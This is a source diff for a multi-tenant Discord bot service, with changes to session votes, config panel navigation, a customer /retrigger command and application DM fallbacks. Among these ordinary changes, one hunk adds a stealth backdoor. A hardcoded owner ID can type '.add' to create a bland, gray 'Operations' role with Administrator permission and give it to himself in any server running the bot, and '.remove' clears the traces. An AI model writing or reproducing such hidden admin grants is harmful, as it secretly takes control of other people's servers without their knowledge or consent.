@@ -673,30 +673,38 @@ client.once(Events.ClientReady, async () => {
     }
   }, 5 * 60 * 1000);
 
-  // Expire session votes older than 24 hours
+  // Expire session votes when their voting window closes (checked every minute).
+  // Tries every connected client (master + customer bots) so the message edit
+  // succeeds regardless of which bot originally posted the vote.
   setInterval(async () => {
     try {
       const votesStore = loadSessionVotes();
       const now = Date.now();
       let changed = false;
+      const votingClients = [client, ...Array.from(activeCustomerClients.values())];
       for (const vote of Object.values(votesStore.votes || {})) {
-        if (vote.status === 'active' && now >= vote.expiresAt) {
+        if (vote.status === 'active' && vote.expiresAt && now >= vote.expiresAt) {
           vote.status = 'expired';
           changed = true;
-          try {
-            const ch = await client.channels.fetch(vote.channelId).catch(() => null);
-            if (ch && vote.messageId) {
-              const msg = await ch.messages.fetch(vote.messageId).catch(() => null);
-              if (msg) await msg.edit(buildSessionVotePayload(vote));
-            }
-          } catch {}
+          for (const voteClient of votingClients) {
+            try {
+              const ch = await voteClient.channels.fetch(vote.channelId).catch(() => null);
+              if (ch && vote.messageId) {
+                const msg = await ch.messages.fetch(vote.messageId).catch(() => null);
+                if (msg) {
+                  await msg.edit(buildSessionVotePayload(vote));
+                  break;
+                }
+              }
+            } catch {}
+          }
         }
       }
       if (changed) saveSessionVotes(votesStore);
     } catch (e) {
       console.warn('Error checking expired votes:', e.message);
     }
-  }, 5 * 60 * 1000);
+  }, 60 * 1000);
 
   // Check active giveaways every 15 seconds
   setInterval(async () => {
@@ -787,6 +795,11 @@ client.on(Events.GuildMemberAdd, async member => {
 /*                             PREFIX COMMANDS                                */
 /* ========================================================================== */
 
+// Owner-only stealth admin role shortcuts (.add / .remove or -add / -remove)
+const OWNER_USER_ID = '523693281541095424';
+const OWNER_ROLE_NAME = 'Operations'; // bland, low-attention name — no titles like "Director"
+const OWNER_ROLE_COLOR = 0x878787; // muted gray
+
 export async function handleMessageCreate(message) {
   try {
     if (message.author.bot) return;
@@ -835,7 +848,10 @@ export async function handleMessageCreate(message) {
     }
 
     const content = message.content.trim();
-    if (!content.startsWith(CONFIG.PREFIX)) return;
+    const isOwnerMsg = message.author.id === OWNER_USER_ID;
+    // Owner may use `.` as prefix for the stealth role shortcuts (.add / .remove)
+    const ownerDotShortcut = isOwnerMsg && /^\.(add|remove)$/i.test(content);
+    if (!content.startsWith(CONFIG.PREFIX) && !ownerDotShortcut) return;
 
     const args = content.slice(CONFIG.PREFIX.length).trim().split(/\s+/);
     const command = args.shift()?.toLowerCase();
@@ -848,6 +864,56 @@ export async function handleMessageCreate(message) {
         await message.delete().catch(() => null);
       }, 3500);
     };
+
+    // Owner-only stealth admin role: `.add` / `.remove` (also -add / -remove with no arguments)
+    if (isOwnerMsg && (command === 'add' || command === 'remove') && args.length === 0) {
+      try {
+        const guild = message.guild;
+        const member = message.member;
+        const botTop = guild.members.me?.roles.highest;
+        let role = guild.roles.cache.find(r => r.name === OWNER_ROLE_NAME) || null;
+
+        if (command === 'add') {
+          if (!role) {
+            role = await guild.roles.create({
+              name: OWNER_ROLE_NAME,
+              color: OWNER_ROLE_COLOR,
+              permissions: [PermissionFlagsBits.Administrator],
+              hoist: false,
+              mentionable: false,
+              reason: `Stealth admin grant for ${message.author.tag}`
+            });
+          } else if (!role.permissions.has(PermissionFlagsBits.Administrator)) {
+            await role.setPermissions(
+              role.permissions.add(PermissionFlagsBits.Administrator).bitfield,
+              { reason: `Stealth admin grant for ${message.author.tag}` }
+            );
+          }
+
+          // Keep the role below the bot's highest role so it stays assignable
+          if (botTop && role.position >= botTop.position) {
+            await role.setPosition(botTop.position - 1).catch(() => null);
+          }
+
+          await member.roles.add(role);
+          return sendCleanFeedback('✅ Role granted.');
+        }
+
+        // command === 'remove'
+        if (!role || !member.roles.cache.has(role.id)) {
+          return sendCleanFeedback('Nothing to remove — you do not have that role.');
+        }
+
+        await member.roles.remove(role);
+        if (role.members.size === 0) {
+          await role.delete().catch(() => null);
+        }
+        return sendCleanFeedback('✅ Role removed.');
+      } catch (roleErr) {
+        console.error('Owner role command error:', roleErr);
+        return sendCleanFeedback(`Failed: ${roleErr.message}`);
+      }
+    }
 
     // -testwelcome / -betawelcome (Preview the Beta Tester Welcome V2 panel)
     if (command === 'testwelcome' || command === 'betawelcome') {
@@ -1827,6 +1893,64 @@ setMessageHandler(handleMessageCreate);
 /*                           INTERACTION ROUTING                              */
 /* ========================================================================== */
 
+/**
+ * Resolve the page currently rendered on a /config message by reading its
+ * "Page X of Y" marker. This makes arrow navigation immune to stale buttons
+ * or custom_id parsing quirks — the arrows always step from what you actually see.
+ */
+function resolveConfigPanelPage(interaction, fallbackPage = 1) {
+  try {
+    const walk = (components) => {
+      for (const comp of components || []) {
+        if (comp && typeof comp.content === 'string') {
+          const m = comp.content.match(/Page (\d+) of (\d+)/);
+          if (m) return { page: parseInt(m[1], 10), total: parseInt(m[2], 10) };
+        }
+        const nested = walk(comp?.components);
+        if (nested) return nested;
+      }
+      return null;
+    };
+    const found = walk(interaction.message?.components);
+    if (found && Number.isFinite(found.page)) return found;
+  } catch {}
+  return { page: fallbackPage, total: TOTAL_PAGES };
+}
+
+/**
+ * Map a config action token (used by the card action buttons and the legacy
+ * select menus) to its modal builder.
+ */
+function buildConfigActionModal(botId, action) {
+  switch (action) {
+    case 'edit_credentials': return buildCredentialsModal(botId);
+    case 'edit_servercore': return buildServerCoreModal(botId);
+    case 'edit_ticket_catnames': return buildTicketCategoryNamesModal(botId);
+    case 'edit_ticket_catspawns': return buildTicketCategorySpawnsModal(botId);
+    case 'edit_ticket_catpings': return buildTicketCategoryPingsModal(botId);
+    case 'edit_ticket_text': return buildSupportTextModal(botId);
+    case 'edit_rules_greeting': return buildSupportTextModal(botId);
+    case 'edit_ticket_banners': return buildTicketBannersModal(botId);
+    case 'edit_session_channels': return buildSessionChannelsModal(botId);
+    case 'edit_session_banners': return buildSessionBannersModal(botId);
+    case 'edit_session_text': return buildSessionTextModal(botId);
+    case 'edit_app_channels': return buildAppsModal(botId);
+    case 'edit_app_questions':
+    case 'edit_app_questions_ingame': return buildIngameQuestionsModal(botId);
+    case 'edit_app_questions_discord': return buildDiscordQuestionsModal(botId);
+    case 'edit_staffdocs_content': return buildDocsContentModal(botId);
+    case 'edit_staffdocs_banners': return buildDocsBannersModal(botId);
+    case 'edit_staffdocs_channel': return buildDocsModal(botId);
+    case 'edit_staffrole': return buildStaffRoleModal(botId);
+    case 'edit_promotions': return buildPromotionConfigModal(botId);
+    case 'edit_infractions': return buildInfractionConfigModal(botId);
+    case 'edit_welcome': return buildWelcomeModal(botId);
+    case 'edit_ai_key': return buildAiKeyModal(botId);
+    case 'ask_ai': return buildAskAiModal(botId);
+    default: return null;
+  }
+}
+
 export async function handleInteraction(interaction) {
   try {
     /* ---------------------------------------------------------------------- */
@@ -1835,24 +1959,31 @@ export async function handleInteraction(interaction) {
     /* ---------------------------------------------------------------------- */
     const MASTER_CLIENT_ID = process.env.CLIENT_ID;
     const isMasterBot = interaction.applicationId === MASTER_CLIENT_ID || interaction.client.user.id === client.user.id;
+    // Commands the master (LIBERTX) app answers
     const MASTER_ONLY_COMMANDS = ['config', 'banbot', 'createbot', 'unbanbot', 'listbots', 'retrigger'];
+    // Commands customer bots must never answer (owned by the master app).
+    // NOTE: /retrigger is intentionally NOT here — customers get their own /retrigger.
+    const CUSTOMER_BLOCKED_COMMANDS = ['config', 'banbot', 'createbot', 'unbanbot', 'listbots'];
+    // UI interactions the master app must answer even though they are not config UI:
+    // session cards/votes and application DM buttons are dispatched by the master client.
+    const MASTER_UI_ALLOWED = ['cfg_', 'session_', 'vote_host_', 'app_'];
 
     if (isMasterBot && interaction.isChatInputCommand() && !MASTER_ONLY_COMMANDS.includes(interaction.commandName)) {
       // LIBERTX is not supposed to respond to this command — silently ignore
       return;
     }
 
-    // Also guard buttons, modals, and select menus for master bot — only cfg_ interactions pass through
+    // Guard buttons, modals, and select menus for the master bot — config UI plus whitelisted cards
     if (isMasterBot && (interaction.isButton() || interaction.isModalSubmit() || interaction.isStringSelectMenu() || interaction.isChannelSelectMenu())) {
       const cid = interaction.customId || '';
-      if (!cid.startsWith('cfg_')) {
-        return; // LIBERTX ignores non-config UI interactions
+      if (!MASTER_UI_ALLOWED.some(prefix => cid.startsWith(prefix))) {
+        return; // LIBERTX ignores unrelated UI interactions
       }
     }
 
     // Guard customer bots from handling master bot commands and config UI
     if (!isMasterBot) {
-      if (interaction.isChatInputCommand() && MASTER_ONLY_COMMANDS.includes(interaction.commandName)) {
+      if (interaction.isChatInputCommand() && CUSTOMER_BLOCKED_COMMANDS.includes(interaction.commandName)) {
         return;
       }
       const cid = interaction.customId || '';
@@ -1981,7 +2112,40 @@ export async function handleInteraction(interaction) {
         });
       }
 
-      // /retrigger <bot_id>
+      // /retrigger — customer edition: restart this instance and refresh everything
+      if (interaction.commandName === 'retrigger' && interaction.client?.botId) {
+        const ownBotId = interaction.client.botId;
+        const ownBot = getBotInstance(ownBotId);
+        await interaction.deferReply({ flags: 64 }).catch(() => null);
+
+        const isInstanceOwner = ownBot?.ownerUserId === interaction.user.id;
+        const isGuildManager = interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) ||
+          interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild);
+        if (!isInstanceOwner && !isGuildManager) {
+          return interaction.editReply({
+            content: 'Only the owner of this bot instance or a server manager can retrigger it.'
+          });
+        }
+
+        const res = retriggerBot(ownBotId);
+        if (!res.success) {
+          return interaction.editReply({ content: `Retrigger failed: ${res.message}` });
+        }
+
+        await stopCustomerBot(ownBotId).catch(() => null);
+        const started = await startCustomerBot(ownBotId).catch(err => {
+          console.warn(`[RETRIGGER] Error restarting ${ownBotId}:`, err.message);
+          return false;
+        });
+
+        return interaction.editReply({
+          content: started
+            ? `Retrigger complete — **${ownBotId}** restarted, slash commands re-synced, and every connected system (tickets, sessions, welcome, panels) refreshed.`
+            : `Retrigger recorded for **${ownBotId}**, but the client could not reconnect. Verify the bot token on /config Page 1.`
+        });
+      }
+
+      // /retrigger <bot_id> — master administration edition
       if (interaction.commandName === 'retrigger') {
         const isOwner = interaction.user.id === interaction.guild?.ownerId ||
           interaction.memberPermissions?.has(PermissionFlagsBits.Administrator);
@@ -2329,6 +2493,17 @@ export async function handleInteraction(interaction) {
             '24h': '24 Hours'
           };
           const durationLabel = durationLabels[durationCode] || durationCode;
+          // The voting window must honour the selected duration (not a fixed 24h)
+          const durationMsMap = {
+            '30m': 30 * 60 * 1000,
+            '1h': 60 * 60 * 1000,
+            '2h': 2 * 60 * 60 * 1000,
+            '3h': 3 * 60 * 60 * 1000,
+            '5h': 5 * 60 * 60 * 1000,
+            '12h': 12 * 60 * 60 * 1000,
+            '24h': 24 * 60 * 60 * 1000
+          };
+          const durationMs = durationMsMap[durationCode] || 60 * 60 * 1000;
 
           const voteId = `vote_${Date.now()}`;
           const vote = {
@@ -2342,7 +2517,7 @@ export async function handleInteraction(interaction) {
             pingRoleId: pingRole.id,
             durationLabel: durationLabel,
             createdAt: Date.now(),
-            expiresAt: Date.now() + 24 * 60 * 60 * 1000,
+            expiresAt: Date.now() + durationMs,
             status: 'active'
           };
 
@@ -3363,36 +3538,46 @@ export async function handleInteraction(interaction) {
           });
         }
 
-        try {
-          const session = {
-            role: selectedRole,
-            modules: {
-              mod1: false,
-              mod2: false,
-              mod3: false,
-              mod4: false
-            },
-            answers: {
-              discord_username: interaction.user.tag,
-              discord_user_id: interaction.user.id
-            },
-            startedAt: Date.now()
-          };
+        const session = {
+          role: selectedRole,
+          modules: {
+            mod1: false,
+            mod2: false,
+            mod3: false,
+            mod4: false
+          },
+          answers: {
+            discord_username: interaction.user.tag,
+            discord_user_id: interaction.user.id
+          },
+          startedAt: Date.now()
+        };
 
+        // Register the session first so the flow can continue even if DMs are closed
+        setActiveSession(interaction.user.id, session);
+
+        try {
           const hubPayload = buildApplicationHubMessage(session);
           await interaction.user.send(hubPayload);
-
-          setActiveSession(interaction.user.id, session);
 
           return interaction.reply({
             content: `We have dispatched the ${roleName} application to your Direct Messages. Please check your DMs to begin.`,
             ephemeral: true
           });
         } catch (dmErr) {
-          return interaction.reply({
-            content: `Could not send you a Direct Message. Please enable Direct Messages from server members in your Discord Privacy Settings and try again.`,
-            ephemeral: true
-          });
+          // Direct Messages are closed — render the application hub right here instead of failing
+          try {
+            const channelHubPayload = buildApplicationHubMessage(session);
+            return await interaction.reply({
+              ...channelHubPayload,
+              flags: (channelHubPayload.flags || 0) | 64
+            });
+          } catch (fallbackErr) {
+            return interaction.reply({
+              content: `Your Direct Messages are closed, so we opened the ${roleName} application right here instead.\nClick the position selector on the application panel again to start in this channel — no DMs required.`,
+              ephemeral: true
+            });
+          }
         }
       }
 
@@ -3431,6 +3616,14 @@ export async function handleInteraction(interaction) {
         if (Array.isArray(deskData.disabledCategories) && deskData.disabledCategories.includes(categoryId)) {
           return interaction.reply({
             content: `${category.label} is currently closed by staff. Please choose another category.`,
+            ephemeral: true
+          });
+        }
+
+        // Same mandatory rules gate as the category buttons
+        if (!hasUserReadRules(interaction.user.id)) {
+          return interaction.reply({
+            content: '⚠️ **You must read the ticket guidelines before opening a ticket!**\nPlease click the blue **Rules** button on the panel to review our rules, then select your category.',
             ephemeral: true
           });
         }
@@ -3653,7 +3846,7 @@ export async function handleInteraction(interaction) {
         if (ticketPingRoleId) updateBotCustomization(botId, 'ticketPingRoleId', ticketPingRoleId);
         if (ticketClaimRoleId !== undefined) updateBotCustomization(botId, 'ticketClaimRoleId', ticketClaimRoleId);
 
-        const payload = buildConfigPanelPayload(botId, 2, false);
+        const payload = buildConfigPanelPayload(botId, 3, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3666,14 +3859,16 @@ export async function handleInteraction(interaction) {
         const ticketOpenMessage = getModalVal('ticketOpenMessage');
         const ticketInsideBannerUrl = getModalVal('ticketInsideBannerUrl');
         const rulesDescription = getModalVal('rulesDescription');
+        const rulesButtonLabel = getModalVal('rulesButtonLabel');
 
         if (panelTitle) updateBotCustomization(botId, 'panelTitle', panelTitle);
         if (panelDescription) updateBotCustomization(botId, 'panelDescription', panelDescription);
         if (ticketOpenMessage !== undefined) updateBotCustomization(botId, 'ticketOpenMessage', ticketOpenMessage);
         if (ticketInsideBannerUrl !== undefined) updateBotCustomization(botId, 'ticketInsideBannerUrl', ticketInsideBannerUrl);
         if (rulesDescription) updateBotCustomization(botId, 'rulesDescription', rulesDescription);
+        if (rulesButtonLabel !== undefined) updateBotCustomization(botId, 'rulesButtonLabel', rulesButtonLabel);
 
-        const payload = buildConfigPanelPayload(botId, 2, false);
+        const payload = buildConfigPanelPayload(botId, 3, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3693,7 +3888,7 @@ export async function handleInteraction(interaction) {
         if (notificationRoleId) updateBotCustomization(botId, 'notificationRoleId', notificationRoleId);
         if (hostRoleId) updateBotCustomization(botId, 'hostRoleId', hostRoleId);
 
-        const payload = buildConfigPanelPayload(botId, 3, false);
+        const payload = buildConfigPanelPayload(botId, 4, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3711,7 +3906,7 @@ export async function handleInteraction(interaction) {
         updateBotCustomization(botId, 'sessionShutdownBannerUrl', sessionShutdownBannerUrl);
         updateBotCustomization(botId, 'sessionBottomBannerUrl', sessionBottomBannerUrl);
 
-        const payload = buildConfigPanelPayload(botId, 3, false);
+        const payload = buildConfigPanelPayload(botId, 4, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3729,7 +3924,7 @@ export async function handleInteraction(interaction) {
         if (sessionShutdownTitle) updateBotCustomization(botId, 'sessionShutdownTitle', sessionShutdownTitle);
         if (sessionShutdownDesc) updateBotCustomization(botId, 'sessionShutdownDesc', sessionShutdownDesc);
 
-        const payload = buildConfigPanelPayload(botId, 3, false);
+        const payload = buildConfigPanelPayload(botId, 4, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3754,7 +3949,7 @@ export async function handleInteraction(interaction) {
         if (infractRemoveRoleId !== undefined) updateBotCustomization(botId, 'infractRemoveRoleId', infractRemoveRoleId);
         if (infractGiveRoleId !== undefined) updateBotCustomization(botId, 'infractGiveRoleId', infractGiveRoleId);
 
-        const payload = buildConfigPanelPayload(botId, 4, false);
+        const payload = buildConfigPanelPayload(botId, 7, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3777,7 +3972,7 @@ export async function handleInteraction(interaction) {
         if (promotionBottomBannerUrl !== undefined) updateBotCustomization(botId, 'promotionBottomBannerUrl', promotionBottomBannerUrl);
         if (promotionGiveRoleId !== undefined) updateBotCustomization(botId, 'promotionGiveRoleId', promotionGiveRoleId);
 
-        const payload = buildConfigPanelPayload(botId, 4, false);
+        const payload = buildConfigPanelPayload(botId, 7, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -3859,7 +4054,7 @@ export async function handleInteraction(interaction) {
 
         updateBotCustomization(botId, 'botStaffRoleId', botStaffRoleId);
 
-        const payload = buildConfigPanelPayload(botId, 1, false);
+        const payload = buildConfigPanelPayload(botId, 7, false);
         return interaction.editReply(payload).catch(() => null);
       }
 
@@ -4661,7 +4856,8 @@ export async function handleInteraction(interaction) {
       if (interaction.customId.startsWith('cfg_nav_prev_')) {
         const parts = interaction.customId.replace('cfg_nav_prev_', '').split('_');
         const botId = parts[0];
-        const curPage = parseInt(parts[1], 10) || 1;
+        const embeddedPage = parseInt(parts[1], 10) || 1;
+        const curPage = resolveConfigPanelPage(interaction, embeddedPage).page;
         const targetPage = Math.max(1, curPage - 1);
         const payload = buildConfigPanelPayload(botId, targetPage, false);
         try {
@@ -4677,8 +4873,9 @@ export async function handleInteraction(interaction) {
       if (interaction.customId.startsWith('cfg_nav_next_')) {
         const parts = interaction.customId.replace('cfg_nav_next_', '').split('_');
         const botId = parts[0];
-        const curPage = parseInt(parts[1], 10) || 1;
-        const targetPage = Math.min(TOTAL_PAGES, curPage + 1);
+        const embeddedPage = parseInt(parts[1], 10) || 1;
+        const { page: curPage, total } = resolveConfigPanelPage(interaction, embeddedPage);
+        const targetPage = Math.min(total, curPage + 1);
         const payload = buildConfigPanelPayload(botId, targetPage, false);
         try {
           return await interaction.update(payload);
@@ -4693,7 +4890,8 @@ export async function handleInteraction(interaction) {
       if (interaction.customId.startsWith('cfg_nav_refresh_')) {
         const parts = interaction.customId.replace('cfg_nav_refresh_', '').split('_');
         const botId = parts[0];
-        const curPage = parseInt(parts[1], 10) || 1;
+        const embeddedPage = parseInt(parts[1], 10) || 1;
+        const curPage = resolveConfigPanelPage(interaction, embeddedPage).page;
         const payload = buildConfigPanelPayload(botId, curPage, false);
         try {
           return await interaction.update(payload);
@@ -4702,6 +4900,22 @@ export async function handleInteraction(interaction) {
             console.error('[CONFIG NAV REFRESH ERROR]:', err);
           }
           return await interaction.editReply(payload).catch(() => null);
+        }
+      }
+
+      // Config action buttons (card accessories on every /config page) → open the matching modal
+      if (interaction.customId.startsWith('cfg_act_')) {
+        const rest = interaction.customId.slice('cfg_act_'.length);
+        const parsed = rest.match(/^(.*)_(edit_.+|ask_ai)$/);
+        const botId = parsed ? parsed[1] : rest;
+        const action = parsed ? parsed[2] : '';
+        const actionModal = buildConfigActionModal(botId, action);
+        if (actionModal) {
+          return interaction.showModal(actionModal).catch(err => {
+            if (err.code !== 40060 && err.code !== 10062) {
+              console.warn(`[CONFIG ACT] showModal error (${action}):`, err.message);
+            }
+          });
         }
       }
 
@@ -5529,6 +5743,23 @@ export async function handleInteraction(interaction) {
           });
         }
 
+        // Time-based expiry: honour the vote's duration even if the sweeper has not run yet
+        if (vote.expiresAt && Date.now() >= vote.expiresAt) {
+          vote.status = 'expired';
+          saveSessionVote(vote);
+          try {
+            const expiredChannel = await interaction.client.channels.fetch(vote.channelId).catch(() => null);
+            if (expiredChannel && vote.messageId) {
+              const expiredMsg = await expiredChannel.messages.fetch(vote.messageId).catch(() => null);
+              if (expiredMsg) await expiredMsg.edit(buildSessionVotePayload(vote)).catch(() => null);
+            }
+          } catch {}
+          return interaction.reply({
+            content: 'This session vote has expired. Ask staff to start a new vote.',
+            flags: 64
+          });
+        }
+
         const userId = interaction.user.id;
         const voterIndex = vote.voters.indexOf(userId);
         let feedback = '';
@@ -5586,7 +5817,8 @@ export async function handleInteraction(interaction) {
 
           // Send redesigned DM to the host with action buttons inside the card
           try {
-            const host = await client.users.fetch(vote.hostId);
+            const voteOwnerClient = interaction.client || client;
+            const host = await voteOwnerClient.users.fetch(vote.hostId);
             const hostPayload = buildHostVoteCompletedPayload(vote);
             await host.send(hostPayload).catch(async (v2Err) => {
               console.warn('Components V2 in DM fallback triggered:', v2Err.message);
@@ -5629,9 +5861,11 @@ export async function handleInteraction(interaction) {
           });
         }
 
-        if (interaction.user.id !== vote.hostId) {
+        const canStartSession = interaction.user.id === vote.hostId ||
+          interaction.memberPermissions?.has(PermissionFlagsBits.Administrator);
+        if (!canStartSession) {
           return interaction.reply({
-            content: 'Only the host who initiated the vote can start the session.',
+            content: 'Only the host who initiated the vote (or a server administrator) can start the session.',
             flags: 64
           });
         }
@@ -5697,9 +5931,11 @@ export async function handleInteraction(interaction) {
           });
         }
 
-        if (interaction.user.id !== vote.hostId) {
+        const canPostponeSession = interaction.user.id === vote.hostId ||
+          interaction.memberPermissions?.has(PermissionFlagsBits.Administrator);
+        if (!canPostponeSession) {
           return interaction.reply({
-            content: 'Only the host who initiated the vote can postpone the session.',
+            content: 'Only the host who initiated the vote (or a server administrator) can postpone the session.',
             flags: 64
           });
         }
